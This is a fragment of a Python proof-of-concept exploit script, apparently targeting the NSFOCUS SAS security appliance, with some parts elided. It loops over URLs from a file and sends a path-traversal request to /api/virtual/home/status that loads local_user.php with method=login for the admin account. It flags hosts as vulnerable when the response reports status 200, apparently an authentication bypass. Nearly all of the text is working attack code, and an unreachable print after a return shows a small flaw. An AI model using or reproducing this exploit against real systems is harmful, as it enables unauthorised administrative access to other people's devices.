...
if len(sys.argv) != 2:
    ...
    print(
        '+ EXP: python3 NsFocus_SAS_LocalUser_Login_Poc.py url.txt                                               +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
...
def exp(host):
    ...
    vulurl = url + "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    try:
        r = requests.get(vulurl, headers=headers,verify=False)
        if r.status_code==200 and "status\":200" in r.text:
            print(url+" :true")    
        else:
            return 0
            print (host+":false")
